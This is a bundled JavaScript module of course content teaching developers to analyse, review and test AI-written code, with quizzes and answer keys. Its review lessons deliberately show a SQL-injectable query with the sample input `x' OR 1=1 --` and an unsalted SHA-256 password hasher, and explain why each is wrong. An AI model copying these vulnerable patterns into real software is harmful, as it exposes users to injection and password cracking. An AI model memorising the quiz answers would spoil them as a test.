const i={id:"ai",title:"AI for Developers",emoji:"🤖",tagline:"AI writes code. You own the result.",lessons:[{id:"ai.analyze-plan",title:"Analyze first, then plan",summary:"Do not jump straight to code — not even with AI.",minutes:4,blocks:[{type:"text",text:`**AI writes code. You own the result.**
The AI assistant is a fast helper that never gets tired. But it does not join the incident call at 2 AM — you do. Everything it writes must pass through your brain before it reaches production.`},{type:"diagram",text:`   Task
     ↓
1. Analyze → restate goal, unknowns, questions
     ↓
2. Plan    → steps, risks, test cases
     ↓
3. Build   → one small step at a time
     ↓
4. Review  → read every line of the diff
     ↓
5. Test    → run it, check what tests assert
     ↓
 You own the result ✅`},{type:"text",text:"Step 1 — **analyze**. Before any code, ask the AI to restate the goal, list what is unclear, and ask you questions. If its summary is wrong, you just saved an hour."},{type:"example",title:"Analyze prompt",text:`Task: "Add CSV export to the Orders page."
Before writing code:
1. Restate the goal in 2–3 sentences.
2. List unknowns and assumptions.
3. Ask me up to 5 clarifying questions.
Do not write code yet.

Typical AI questions back: Which columns? Include cancelled orders? Max number of rows? Who is allowed to export?`},{type:"text",text:"Step 2 — **plan**. Ask for a step-by-step plan with **risks** and **test cases**. Then build one step at a time: implement, review, run tests, next step."},{type:"compare",left:{title:"Code-first prompt ⚠️",items:['"Write the export feature."',"The AI guesses the requirements","Big diff, hard to review","Wrong guesses show up in QA"]},right:{title:"Plan-first prompt ✅",items:['"Plan it: steps, risks, test cases. No code yet."',"Wrong guesses show up early, while cheap","Small steps, small diffs","Test cases ready before the code"]}},{type:"text",text:'Some questions the AI asks are **business questions** ("Include cancelled orders?"). Neither you nor the AI should guess. Ask the person who owns the requirement.'}],remember:"AI writes code. You own the result. Analyze → plan → small steps.",questions:[{id:"ai.analyze-plan.1",kind:"scenario",difficulty:"easy",prompt:'A ticket says "Add CSV export to the Orders page." You paste it into the AI assistant and it immediately writes 400 lines across 6 files. What would have been a better first prompt?',choices:["Ask for the same code, but with more comments for review","Ask it to put all the code in one file so it is easier to read","Ask it to restate the goal and list unknowns before any code","Ask it to generate two versions and keep the shorter one"],answer:2,why:"A short ticket hides many decisions: columns, filters, size limits, permissions. Letting the AI restate the goal and ask questions exposes wrong guesses before they become 400 lines of code."},{id:"ai.analyze-plan.2",kind:"scenario",difficulty:"medium",prompt:'While analyzing a refund feature, the AI asks: "Should refunds be allowed after 30 days?" The ticket does not say. What do you do?',choices:["Let the AI pick the rule most online shops use","Pick 30 days yourself — it sounds reasonable","Ask the product owner and write the answer in the ticket","Skip the check for now and let QA decide later"],answer:2,why:"This is a business rule. The AI cannot know your company policy, and a guess becomes a bug that looks like a feature. Confirm it with the person who owns the requirement.",remember:"Business rule unclear → ask a human, not the AI."},{id:"ai.analyze-plan.3",kind:"compare",difficulty:"medium",prompt:"You need a change that touches the API, the database schema and the UI. Which prompt is better to start with?",choices:['"Here is the ticket. Implement this change fully, in all three layers, with all the code."','"Here is the ticket. Give a step-by-step plan with risks and test cases. No code yet."'],answer:1,why:"For a multi-layer change, a plan shows the order of work, the risky parts (like a schema migration) and how to test each step. Reviewing a plan is much cheaper than reviewing a huge diff."},{id:"ai.analyze-plan.4",kind:"truefalse",difficulty:"easy",prompt:"If the AI assistant wrote the code and it breaks production, the responsibility belongs to the AI tool.",choices:["True","False"],answer:1,why:"The developer who commits the code owns it. The AI is a tool, like a compiler or a library — you decide what goes in.",remember:"AI writes code. You own the result."},{id:"ai.analyze-plan.5",kind:"scenario",difficulty:"hard",prompt:"The AI gives you a good 6-step plan. What is the best way to implement it?",choices:["One step at a time: generate, review, test, then the next","Ask for all 6 steps in one big answer to save some time","Build all 6 steps first, then write the tests at the very end","Skip review of the small steps and only review the final result"],answer:0,why:"Small steps keep each diff small enough to really read. If a test fails, you know exactly which step broke it."}]},{id:"ai.context",title:"Give the right context",summary:"Too little → generic answers. Too much → noise.",minutes:4,blocks:[{type:"text",text:"The AI only knows what you tell it, plus what it learned in training (which may be old). It does not see your logs, your team rules or the bug on your screen unless you give them."},{type:"diagram",text:`Too little       Just right         Too much
"fix the bug"    goal + error +     whole repo,
                 2–3 key files      10 log files
     ↓                ↓                  ↓
generic answer   specific answer    lost in noise`},{type:"list",items:["**Goal** — what should happen, and what happens instead.",'**Error** — the full message and stack trace, not "it crashes".',"**Relevant code** — the method, its callers, the related types. Not the whole repo.","**Versions** — .NET 8 or .NET Framework 4.8? React 18 or 19? The answers differ.",'**Constraints** — "no new packages", "SQL Server 2019", "must not change the public API".',"**What you already tried** — so it does not suggest the same thing again."]},{type:"compare",left:{title:"Bad prompt ⚠️",items:["(pastes a 2,000-line file)",'"Fix the bug."']},right:{title:"Good prompt ✅",items:['"`CalculateTotal` returns 90 for this cart; expected 100."','"The discount should apply once, not per item."','"Here is the method and the `Cart` type. .NET 8."','"I already checked rounding; it is not that."']}},{type:"text",text:"Never paste secrets: passwords, API keys, connection strings, customer personal data. Replace them with placeholders like `<PASSWORD>`."}],remember:"Give the goal, the error, the relevant code, versions and constraints — not everything.",questions:[{id:"ai.context.1",kind:"scenario",difficulty:"easy",prompt:'You paste a 2,000-line file and write "fix the bug". The answer is generic: "check for null values and add logging". Why?',choices:["AI assistants work much better with JavaScript than with C#","You should have asked in a more polite and friendly way","The AI needs the file split into many smaller files first","It has no symptom, no expected result and no error to work from"],answer:3,why:'The AI cannot guess which of 2,000 lines is "the bug". Describe expected vs actual behavior, give the error, and point to the relevant part.',remember:"No symptom in the prompt → generic answer."},{id:"ai.context.2",kind:"scenario",difficulty:"medium",prompt:"The AI suggests code with `record struct` and file-scoped namespaces. Your project targets .NET Framework 4.8 with C# 7.3, so it does not compile. What context was missing from your prompt?",choices:["The target framework and C# language version","The coding style guide of your team","The list of NuGet packages already installed","The folder structure of the solution"],answer:0,why:"Both features need C# 10. Without a version, the AI often assumes a recent one. State versions up front.",remember:"Always say your versions."},{id:"ai.context.3",kind:"compare",difficulty:"medium",prompt:"You want help with a slow endpoint. Which prompt gives better results?",choices:['Paste the endpoint, the query it runs, the timings, and "SQL Server 2019, EF Core 8"','Paste all 180 files of the solution plus last week of logs, and ask "why is it slow?"'],answer:0,why:"Dumping everything buries the important part in noise. Focused context with real measurements points the AI at the actual problem."}]},{id:"ai.review",title:"Review AI code like a stranger's PR",summary:"Read every line. The AI is confident, not careful.",minutes:5,blocks:[{type:"text",text:"AI code **looks** clean: good names, nice formatting, helpful comments. That makes it easy to approve without really reading. Review it like a pull request from a new teammate you have never met."},{type:"list",items:["**Does it do what was asked?** Not more, not less.","**Edge cases** — null, empty list, zero, huge input, duplicates, time zones.","**Error handling** — are errors handled and logged, or silently swallowed?","**Security** — SQL built from strings, missing auth checks, secrets in code, user input in HTML.","**Performance** — queries inside loops, loading whole tables, `.Result` on async calls.","**Fits the codebase** — same patterns, naming, logging and DI style as the rest of the project."]},{type:"code",code:{lang:"csharp",text:`// AI: "Here is a clean helper to get the user's age."
public static int GetAge(DateTime birthDate)
{
    return DateTime.Now.Year - birthDate.Year;
}
// Looks fine. Wrong for anyone whose birthday
// has not happened yet this year.`}},{type:"text",text:'**Diff size matters.** You asked for a one-line fix and got 300 changed lines? Stop. Ask what each change is for, or ask again with "change only X".'},{type:"example",title:"A common story",text:'A developer asked the AI to "add a field to the DTO". The diff also renamed two properties "for consistency". The mobile app used those JSON names and broke the next morning.'}],remember:"Read every line. If you cannot explain it, you cannot ship it.",questions:[{id:"ai.review.1",kind:"code",difficulty:"medium",prompt:"The AI wrote this EF Core query. What is the biggest problem?",code:{lang:"csharp",text:`var users = await db.Users
    .FromSqlRaw($"SELECT * FROM Users WHERE Email = '{email}'")
    .ToListAsync();`},choices:["SQL injection: user input goes straight into the SQL text","`ToListAsync` should be replaced with `ToList`","It should select only `Id` instead of `*`","Email comparison must always be case-sensitive"],answer:0,why:"The string is built before EF Core sees it, so input like `x' OR 1=1 --` changes the query. Use LINQ, or `FromSql` / `FromSqlInterpolated` with an interpolated string, so values become parameters.",remember:"User input in SQL text = injection."},{id:"ai.review.2",kind:"code",difficulty:"medium",prompt:"You review this AI-generated function. The API returns 404 for unknown users. What happens?",code:{lang:"ts",text:"export async function getUser(id: string): Promise<User> {\n  const res = await fetch(`/api/users/${id}`);\n  return await res.json();\n}"},choices:["`fetch` throws on 404, so the caller gets an exception","TypeScript blocks the bad response at compile time","The 404 error body is returned as if it were a `User`, or parsing fails","The browser retries the request a few times automatically"],answer:2,why:"`fetch` only rejects on network errors, not on HTTP 4xx/5xx. Check `res.ok` before parsing. The `Promise<User>` type checks nothing at runtime."},{id:"ai.review.3",kind:"code",difficulty:"hard",prompt:'The AI says: "This is simple and correct." Which input breaks it?',code:{lang:"csharp",text:`public static decimal AverageOrderValue(List<Order> orders)
{
    return orders.Sum(o => o.Total) / orders.Count;
}`},choices:["A list with exactly one order","An empty list","Orders with totals over 1,000,000","Orders with negative totals (refunds)"],answer:1,why:"With no orders, `orders.Count` is 0 and decimal division by zero throws `DivideByZeroException`. What to return then (0, null, an error?) is a requirement question.",remember:"Always ask: what about empty?"},{id:"ai.review.4",kind:"scenario",difficulty:"medium",prompt:'You asked the AI to fix a typo in an error message. The diff changes 280 lines in 9 files, including "small cleanups". What do you do?',choices:["Approve it — free cleanup in the same PR is a nice bonus","Approve it as long as the build and the linter both pass","Ask the AI if all the changes are safe and trust its answer","Ask for only the typo fix; do any cleanup as a separate change"],answer:3,why:"A huge diff for a tiny task can hide behavior changes and is hard to review well. Keep each change focused.",remember:"Small task → small diff."},{id:"ai.review.5",kind:"perf",difficulty:"medium",prompt:"This AI-generated code works in your test cart with 5 products. In production a cart can have 300 products. What will a careful review catch?",code:{lang:"csharp",text:`foreach (var id in productIds)
{
    var p = await db.Products.FirstAsync(x => x.Id == id);
    total += p.Price;
}`},choices:["One database query per product — an N+1 pattern","`FirstAsync` is not supported by EF Core","`foreach` should be a `for` loop for speed","Adding 300 decimals is slow"],answer:0,why:"Each loop step is a database round trip. Load all needed products in one query, for example `Where(p => productIds.Contains(p.Id))`."}]},{id:"ai.testing",title:"Test it — and test the tests",summary:"AI can write tests that pass on wrong code.",minutes:4,blocks:[{type:"text",text:"Step one is simple: **run the code**. Some AI answers do not compile. Others compile and do the wrong thing. Reading alone is not enough."},{type:"text",text:"The AI is fast at writing tests. But a test is only useful if it **fails when the code is wrong**. AI tests often pass no matter what."},{type:"code",code:{lang:"csharp",text:`var result = PriceService.ApplyDiscount(100m, 0.2m);

// ⚠️ Weak: passes for many wrong answers
Assert.True(result > 0);

// ✅ Strong: checks the exact business result
Assert.Equal(80m, result);`}},{type:"list",items:['Only checks "does not throw" or "is not null".',"Computes the expected value with the **same formula** as the code — a copied bug passes.","Mocks the very thing it should test.","Only the happy path — no empty, null, boundary or error cases.","The AI **changed an assertion** to make a failing test pass."]},{type:"example",title:"The 10-second check",text:"Break the code on purpose: change `0.2m` to `0.3m`, or `>` to `>=`. Run the tests. If they still pass, the tests are not protecting you."},{type:"text",text:'Take expected values **from the requirement**, not from the code. "100 with 20% off → 80" is a requirement. `price * (1 - rate)` is just the implementation again.'}],remember:"A test that cannot fail is not a test. Break the code and watch it go red.",questions:[{id:"ai.testing.1",kind:"code",difficulty:"easy",prompt:"The AI wrote this xUnit test. It passes. What is wrong with it?",code:{lang:"csharp",text:`[Fact]
public void CalculateShipping_Works()
{
    var order = TestData.Order(weightKg: 12);
    var service = new ShippingService();

    var ex = Record.Exception(() => service.CalculateShipping(order));

    Assert.Null(ex);
}`},choices:["Nothing — a passing test means the code is correct","`Record.Exception` does not exist in xUnit","It only checks that nothing throws, not the shipping cost","Test method names must start with `Test`"],answer:2,why:'A wrong shipping price would still pass. Assert the actual result for known inputs, for example "12 kg → 15.00".',remember:'"Does not throw" is not a real assertion.'},{id:"ai.testing.2",kind:"scenario",difficulty:"medium",prompt:'Three tests fail. You ask the AI to "make the tests pass". Its diff changes `Assert.Equal(90m, total)` to `Assert.Equal(100m, total)`. What happened?',choices:["The AI found and fixed the bug in the code","The AI hid the bug by changing what the test expects","The old test was surely wrong, so this is fine","Nothing important — it is only a test file"],answer:1,why:"The goal was correct code, not green tests. Check what the requirement says. If 90 is right, the code must change, not the test.",remember:"Watch for diffs that edit assertions."},{id:"ai.testing.3",kind:"code",difficulty:"hard",prompt:"The VAT rate should be 8%, but the code uses 10%. Why does this AI-generated test still pass?",code:{lang:"ts",text:`// Code under test
export const vat = (net: number) => net * 0.1;

// AI-generated test
it('calculates VAT', () => {
  const net = 250;
  expect(vat(net)).toBe(net * 0.1);
});`},choices:["`toBe` ignores small number differences","The test runner caches results from older runs","Number tests are skipped unless marked as async","The expected value uses the same wrong formula as the code"],answer:3,why:"The test repeats the implementation, so it repeats the bug. Use a known value from the requirement: `expect(vat(250)).toBe(20)`.",remember:"Expected values come from the requirement, not the code."},{id:"ai.testing.4",kind:"scenario",difficulty:"medium",prompt:"How can you quickly check whether AI-written tests really protect a method?",choices:["Break the code on purpose and see if a test fails","Check that line coverage for the method is 100%","Count the tests — more than 10 is usually enough","Ask the AI to rate the quality of its own tests"],answer:0,why:"Coverage only shows which lines ran, not whether anything was checked. If a deliberate bug does not turn a test red, the tests are weak."}]},{id:"ai.hallucinations",title:"Spot hallucinations",summary:"Confident, fluent — and invented.",minutes:4,blocks:[{type:"text",text:"A **hallucination** is when the AI states something false with full confidence. It predicts text that **looks** right. It does not check a source."},{type:"list",items:["**Invented APIs** — a method, overload or option that does not exist.","**Invented packages** — a NuGet or npm name that sounds real but is not.","**Invented config keys** — settings nothing reads, so they silently do nothing.","**Wrong version** — behavior from an older or newer version than yours.","**Wrong explanations** — a convincing reason for a bug that is not the real cause."]},{type:"code",code:{lang:"csharp",text:`// AI suggestion
services.AddDbContextPool<AppDbContext>(o =>
    o.UseSqlServer(conn)
     .EnableSmartQueryCache(true)); // ← does this exist?`}},{type:"diagram",text:`AI says "X exists"
        ↓
Does it compile? ──── no ───► invented
        ↓ yes
In the official docs for YOUR version?
        ↓ yes
Does a test show it changes behavior?
        ↓ yes
   OK to use ✅`},{type:"example",title:"Invented packages are a security risk",text:"The AI suggests a package with a nice name you have never seen. It may not exist — or someone may have published it on purpose, because attackers register names that AI assistants tend to invent (sometimes called **slopsquatting**). Before installing, check the publisher, age, downloads and source repository."},{type:"text",text:"Config keys are sneaky. In `appsettings.json`, a key that nothing reads is simply ignored — no error, no effect."}],remember:"Trust the compiler and the official docs, not the confident tone.",questions:[{id:"ai.hallucinations.1",kind:"scenario",difficulty:"medium",prompt:"The AI suggests `services.AddDbContextPool(...)` with an option `.EnableSmartQueryCache(true)`. You cannot find it in the EF Core docs. What do you do?",choices:["Keep it — the AI probably knows an undocumented feature","Assume it may be invented: check compiler and docs, drop it if missing","Search NuGet for any package that adds a method with that name",'Ask the AI "are you sure?" and go with whatever it answers'],answer:1,why:"If it is not in the docs for your version and does not compile, it does not exist. Asking the AI again often gets a second confident answer, not proof.",remember:"Not in the docs + does not compile = invented."},{id:"ai.hallucinations.2",kind:"scenario",difficulty:"hard",prompt:"The AI tells you to `npm install` a package. On the registry it was published 3 weeks ago, has almost no downloads and no linked repository. What is the main risk?",choices:["The package may be slower than a popular one","npm will refuse to install such a new package","It will make the bundle size a little larger","It may be malicious, registered for a name AIs invent"],answer:3,why:"Attackers publish packages under names that AI assistants tend to make up. Installing can run their code (install scripts) on your machine and in your build. Check publisher, age, downloads and source first.",remember:"Unknown package from AI → verify before install."},{id:"ai.hallucinations.3",kind:"debug",difficulty:"medium",prompt:'You added a setting the AI suggested to `appsettings.json`: `"Kestrel": { "EnableTurboMode": true }`. No error at startup, but nothing changes. What is the most likely reason?',choices:["JSON booleans must be written as strings in appsettings","Kestrel settings are only read in the Production environment","The key does not exist, and unread config keys are just ignored","The app must be restarted twice to load new settings"],answer:2,why:"By default, configuration keys that no code reads are ignored. A hallucinated flag fails silently. Check the documented options for your version."},{id:"ai.hallucinations.4",kind:"scenario",difficulty:"medium",prompt:'The AI explains: "This deadlock happens because async methods always run on a new thread." It sounds smart. What is the right reaction?',choices:["Treat it as a hypothesis and check it against docs or a small test","Accept it — the explanation is detailed and sounds expert","Stop using AI for any explanation from now on","Ask two other AI tools and take the majority answer"],answer:0,why:"A fluent explanation is not proof. This one is actually false: async methods do not always run on a new thread. Verify any claim that drives your fix."},{id:"ai.hallucinations.5",kind:"truefalse",difficulty:"easy",prompt:"If AI-generated code compiles, it cannot contain a hallucination.",choices:["True","False"],answer:1,why:"Compiling only proves the names exist. The AI can still misuse an API, use the wrong version behavior, or add a config key that is silently ignored."}]},{id:"ai.debug-refactor-perf",title:"Debugging, refactoring and performance",summary:"Hypotheses, small steps, real measurements.",minutes:5,blocks:[{type:"text",text:"**Debugging.** Give the AI evidence, not a feeling: the full stack trace, logs around the error, the input, and **what changed** (deploy, config, data). Ask for **hypotheses ranked by evidence** and how to confirm each one — not a blind fix."},{type:"example",title:"Good debugging prompt",text:`After today's deploy, \`POST /orders\` returns 500 for about 5% of requests.
Stack trace: (full trace)
Logs around the error: (lines)
Changed in this deploy: new discount rule, EF Core patch upgrade.
Give 3 hypotheses ranked by how well they fit this evidence, and how to confirm each. No fix yet.`},{type:"compare",left:{title:"Blind fix ⚠️",items:["Wrap it in try/catch and ignore","Add a null check where it crashed","Error disappears, bug stays"]},right:{title:"Root cause ✅",items:["Why is it null?","Which change made it null?","Fix the cause, add a test that reproduces it"]}},{type:"text",text:'**Refactoring** means changing the structure **without changing behavior**. With AI: tests first, then small steps, run tests after each step. Never mix "refactor" and "fix a bug" in one change.'},{type:"diagram",text:`Refactor loop with AI
 ┌──► tests green?
 │        ↓ yes
 │    AI makes ONE small change
 │        ↓
 │    review diff + run tests
 └────────┘`},{type:"text",text:'**Performance.** Give the AI real data: the execution plan, profiler output, timings. It can explain a plan and suggest ideas. But **you measure before and after**. "This will be 3× faster" from an AI is a guess, not a result.'}],remember:"Debug: hypotheses, not blind fixes. Refactor: same behavior, small steps. Perf: measure yourself.",questions:[{id:"ai.debug-refactor-perf.1",kind:"debug",difficulty:"medium",prompt:'Users report missing invoices. Logs showed a `NullReferenceException` in `SendInvoice`. The AI "fixed" it like this. What is the problem?',code:{lang:"csharp",text:`try
{
    await invoiceService.SendInvoice(order);
}
catch (Exception)
{
    // ignore
}`},choices:["Nothing — the crash is gone, so it is fixed","It should catch `NullReferenceException`, not `Exception`","try/catch blocks are too slow to use in C#","The failure is now hidden: invoices still fail, with no log"],answer:3,why:"Swallowing the exception removes the symptom, not the cause. Find out why something is null, fix that, and let real failures be logged.",remember:"Empty catch = hidden bug."},{id:"ai.debug-refactor-perf.2",kind:"scenario",difficulty:"hard",prompt:'You ask the AI to split a 600-line `PriceCalculator` into smaller classes. The diff also "fixes" a rounding rule along the way. All tests pass. What is the problem?',choices:["None — the code is cleaner and the tests pass","Refactors should never create new classes","A behavior change is hidden in a refactor; prices may differ now","Rounding rules should live in the database instead"],answer:2,why:"A refactor must not change behavior. A rounding change is a separate, reviewed change — maybe a business decision. Green tests only mean no test covered that case.",remember:"Refactor and behavior change: never in the same diff."},{id:"ai.debug-refactor-perf.3",kind:"scenario",difficulty:"medium",prompt:"You want the AI to refactor legacy code that has no tests. What should you do first?",choices:["Add tests that lock in what the code does today","Delete the old code and ask the AI for a rewrite","Refactor everything in one big step to save time","Turn off compiler warnings so the diff is cleaner"],answer:0,why:"Tests that capture current behavior (characterization tests) give you a safety net. Then each small refactor step can be checked against them."},{id:"ai.debug-refactor-perf.4",kind:"perf",difficulty:"hard",prompt:'You give the AI the execution plan of a slow query. It says: "Add this index and the query will be 10× faster." What is the right next step?',choices:["Create the index in production right away","Try it on realistic data and compare plan and reads before/after","Add a few more indexes on other columns to be safe","Ask the AI to double-check its 10× estimate"],answer:1,why:"The AI cannot run your query on your data. Measure the plan, logical reads and timing — and remember a new index also adds cost to every write.",remember:"AI estimates are guesses. Measurements are facts."}]},{id:"ai.trust",title:"When NOT to trust AI",summary:"Know where the AI is weakest.",minutes:4,blocks:[{type:"text",text:"The AI is great for boilerplate, explaining code, first drafts and ideas. Be extra careful where a mistake is expensive, or where the AI simply cannot know the answer."},{type:"list",items:["**Security-sensitive code** — auth, password hashing, crypto, permissions. Use proven libraries and get a human review.","**Secrets in prompts** — never paste passwords, keys, tokens or customer personal data.","**Business rules** — tax, refunds, discounts, legal limits. The AI knows typical rules, not yours.","**Recent versions** — training has a cutoff date. New releases and breaking changes may be missing.","**Licensing** — a long code block may be a near copy of licensed code. Follow your company policy.",'**Numbers without a source** — "40% faster", "used by 90% of teams". Ask for a source or measure.']},{type:"code",code:{lang:"csharp",text:`// AI: "Here is a simple way to store passwords."
public static string HashPassword(string password)
{
    using var sha = SHA256.Create();
    var bytes = sha.ComputeHash(Encoding.UTF8.GetBytes(password));
    return Convert.ToBase64String(bytes);
}`}},{type:"compare",left:{title:"Good uses ✅",items:["Boilerplate and mapping code","Explaining unfamiliar code","First drafts of tests","Ideas and hypotheses"]},right:{title:"Extra caution ⚠️",items:["Auth, crypto, permissions","Money, tax and legal rules","Anything with secrets or personal data",'"Latest version" questions']}},{type:"example",title:"Rule of thumb",text:'Ask yourself: "If this is wrong, who gets hurt — and would I notice?" The worse the answer, the more you verify yourself.'}],remember:"The AI does not know your business, your secrets policy or last month's release. You do.",questions:[{id:"ai.trust.1",kind:"code",difficulty:"hard",prompt:"The AI wrote this method for storing user passwords. What is the main problem?",code:{lang:"csharp",text:`public static string HashPassword(string password)
{
    using var sha = SHA256.Create();
    var bytes = sha.ComputeHash(Encoding.UTF8.GetBytes(password));
    return Convert.ToBase64String(bytes);
}`},choices:["SHA-256 output is too long for a database column","Base64 output should be hex for passwords","It is fast and unsalted — use a slow, salted password hasher","`Encoding.UTF8` cannot handle non-English passwords"],answer:2,why:"A fast, unsalted hash lets attackers try billions of guesses and spot users with the same password. Use a proven hasher (PBKDF2, bcrypt, Argon2), e.g. ASP.NET Core Identity’s `PasswordHasher`.",remember:"Never invent your own password storage."},{id:"ai.trust.2",kind:"scenario",difficulty:"hard",prompt:"To debug a login problem, a teammate pasted `appsettings.Production.json` into an AI prompt. It contains the real database password. What should happen next?",choices:["Treat it as leaked: rotate the password, use placeholders next time","Nothing — prompts are private and deleted right after the answer","Ask the AI assistant politely to forget the password it saw","Rename the file so it is no longer marked as production"],answer:0,why:"Once a secret leaves your machine, you cannot control where it is stored or logged. Rotating it makes the leaked value useless. Follow your team’s incident process.",remember:"Secret in a prompt = leaked secret."},{id:"ai.trust.3",kind:"scenario",difficulty:"medium",prompt:'The ticket says "VIP customers get a discount". The AI code adds: 10% off, not combined with other promotions, only for orders over 50. What do you do?',choices:["Keep it — these are common rules in many shops","Ask the AI where the rules came from and accept its reason","Remove all discount logic until the next sprint","Confirm the exact rules with the product owner first"],answer:3,why:"The AI filled the gaps with typical rules, not your rules. Percent, combining and minimum amount are business decisions. Confirm them before shipping.",remember:"The AI invents business rules to fill gaps."},{id:"ai.trust.4",kind:"scenario",difficulty:"medium",prompt:"A library released a new major version 2 months ago. You ask the AI how to migrate. What should you keep in mind?",choices:["Its answers are always up to date with the latest release","Its training may predate the release — check the official guide","It will always refuse to answer questions about new versions","Major versions of popular libraries rarely break anything"],answer:1,why:"The AI may describe the old version or guess the new one. Official release notes and the migration guide are the source of truth."}]}],cheatSheet:[{title:"Prompt checklist",items:[{term:"Analyze first",meaning:'"Restate the goal, list unknowns, ask me questions. No code yet."'},{term:"Plan first",meaning:'"Steps, risks, test cases." Then build one step at a time'},{term:"Goal",meaning:"Expected vs actual behavior, with a concrete example"},{term:"Evidence",meaning:"Full error + stack trace + logs + what changed"},{term:"Context",meaning:"Relevant files only, versions, constraints, what you tried"},{term:"Secrets",meaning:"Never in prompts — use `<PLACEHOLDER>`"}]},{title:"Review checklist",items:[{term:"Scope",meaning:"Does exactly what was asked — small task → small diff"},{term:"Edge cases",meaning:"null, empty, zero, huge input, duplicates, time zones"},{term:"Errors",meaning:"No empty `catch`; failures are logged, not hidden"},{term:"Security",meaning:"No SQL from strings, auth checks present, no secrets in code"},{term:"Performance",meaning:"No queries in loops, no whole-table loads, no `.Result`"},{term:"Style",meaning:"Matches the patterns already in the codebase"}]},{title:"Testing AI code",items:[{term:"Run it",meaning:"Reading is not enough — compile and execute"},{term:"Weak test",meaning:'Only "does not throw" / "not null" / `> 0`'},{term:"Mirror test",meaning:"Expected value uses the same formula as the code → bug passes"},{term:"Break it",meaning:"Change the code on purpose — a test must go red"},{term:"Edited assertion",meaning:"AI changed the expected value → the bug was hidden"}]},{title:"Red flags",items:[{term:"Unknown API / option",meaning:"Not in the docs for your version → likely invented"},{term:"Unknown package",meaning:"New, few downloads, no repo → possible malicious look-alike"},{term:"Config key with no effect",meaning:"Unread keys are ignored silently → check the docs"},{term:'"X× faster"',meaning:"A guess until you measure it yourself"},{term:"Business rule appeared",meaning:"The AI filled a gap → confirm with a human"},{term:"Refactor + fix in one diff",meaning:"Hidden behavior change → split it"}]}]},r=Object.freeze(Object.defineProperty({__proto__:null,default:i},Symbol.toStringTag,{value:"Module"})),n={id:"architecture",title:"Architecture",emoji:"🏗️",tagline:"Structure, boundaries and trade-offs",lessons:[{id:"architecture.coupling-cohesion",title:"Coupling and cohesion",summary:"The two ideas behind almost every design rule.",minutes:3,blocks:[{type:"text",text:`Almost every architecture idea tries to improve two things:
**Coupling** = how much one part depends on another part.
**Cohesion** = how well the things inside one part belong together.`},{type:"diagram",text:`Goal: LOW coupling, HIGH cohesion

┌─ Orders ────────┐         ┌─ Billing ───────┐
│ CreateOrder     │         │ CreateInvoice   │
│ CancelOrder     │ ──────► │ GetInvoice      │
│ OrderRules      │  small  │ InvoiceRules    │
└─────────────────┘   API   └─────────────────┘
related code together      one narrow connection`},{type:"example",title:"Hidden coupling",text:"The Reports code reads the Billing tables directly with SQL. The Billing team renames a column. Reports breaks in production — and the Billing team did not even know Reports used that table."},{type:"compare",left:{title:"Low cohesion ⚠️",items:["`Utils.cs` with 80 unrelated methods",'A "Helpers" folder for everything',"One feature change touches 10 folders"]},right:{title:"High cohesion ✅",items:["A folder per feature: `Orders/`, `Billing/`","Code that changes together lives together","One feature change touches one place"]}},{type:"text",text:"Coupling is never zero — parts must talk to each other. The goal is to depend on **small, stable contracts** (an interface, an API, an event), not on another part's internals like its tables or private classes."}],remember:"Keep related code together. Depend on contracts, not internals.",questions:[{id:"architecture.coupling-cohesion.1",kind:"scenario",difficulty:"medium",prompt:'Adding a small "gift wrap" option needs edits in 9 files across `Controllers/`, `Services/`, `Repositories/`, `Dtos/` and `Validators/`. What does this suggest?',choices:["The app is too big and should be split into microservices","One feature is spread across many places (low cohesion)","The team needs more developers to handle this many files","Nothing: splitting code by technical layer is always ideal"],answer:1,why:"When one small feature touches many folders, related code is not kept together. Grouping by feature (e.g. `Orders/GiftWrap`) often helps. Microservices would spread it even further."},{id:"architecture.coupling-cohesion.2",kind:"debug",difficulty:"medium",prompt:"The Billing team renames a column in their `Invoices` table. The next day the Reports module crashes, even though nobody touched Reports. What is the root problem?",choices:["SQL Server does not allow renaming a column that has data in it","Reports had too many unit tests, and they broke after the rename","Reports reads Billing's table directly — hidden tight coupling","The new column name is too long for SQL Server to handle"],answer:2,why:"Reports depended on Billing's internal storage, not on a contract. Billing could not know about it. If Reports used a Billing API or view, the rename would be safe.",remember:"Another module's tables are its internals. Use its API."},{id:"architecture.coupling-cohesion.3",kind:"mcq",difficulty:"easy",prompt:"Which is the best sign of **high cohesion**?",choices:["A `Helpers` class used by every module","A class with 3,000 lines that does everything","Every module calls every other module","Code that changes together lives together"],answer:3,why:"High cohesion means the things in one place belong to one job. Then a change stays in one place instead of spreading out."}]},{id:"architecture.solid",title:"SOLID, the practical version",summary:"Five good questions — not five laws.",minutes:4,blocks:[{type:"text",text:"SOLID is five guidelines for designing classes. Use them as **questions to ask**, not as laws to obey."},{type:"list",items:["**S — Single responsibility**: one reason to change. `InvoiceService` should not also send emails and resize images.","**O — Open/closed**: add new behaviour by adding code, not by editing a huge `switch` every time.","**L — Liskov substitution**: a subclass must work everywhere its base class works.","**I — Interface segregation**: small interfaces. A class that only reads should not have to implement `Delete()`.","**D — Dependency inversion**: depend on abstractions. `OrderService` asks for `IPaymentGateway`, not `new StripeClient()`."]},{type:"code",code:{lang:"csharp",text:`// ❌ every new payment type = edit this switch
decimal Fee(string type) => type switch
{
    "card"   => 0.30m,
    "paypal" => 0.50m,
    _ => throw new NotSupportedException(type)
};

// ✅ new type = new class, old code untouched
public interface IPaymentMethod { decimal Fee(); }

public class Card : IPaymentMethod
{
    public decimal Fee() => 0.30m;
}`}},{type:"compare",left:{title:"Worth it when",items:["The code changes often","Many people work on it","You need to test parts alone"]},right:{title:"Overkill when",items:["A switch with 2 cases that never change","An interface with one class, forever","A 50-line script"]}},{type:"text",text:"Too much SOLID creates a new problem: 40 tiny classes and interfaces to follow one simple feature. Simple and a little repetitive often beats clever and abstract. AI tools love to generate extra layers — ask if each one pays for itself."}],remember:"SOLID = good questions, not laws. Add abstraction when it pays for itself.",questions:[{id:"architecture.solid.1",kind:"code",difficulty:"hard",prompt:"Code that takes a `FileStorage` crashes when it receives a `ReadOnlyStorage`. What is the design problem?",code:{lang:"csharp",text:`public class FileStorage
{
    public virtual void Save(string path, byte[] data)
    { /* write file */ }
}

public class ReadOnlyStorage : FileStorage
{
    public override void Save(string path, byte[] data)
        => throw new NotSupportedException();
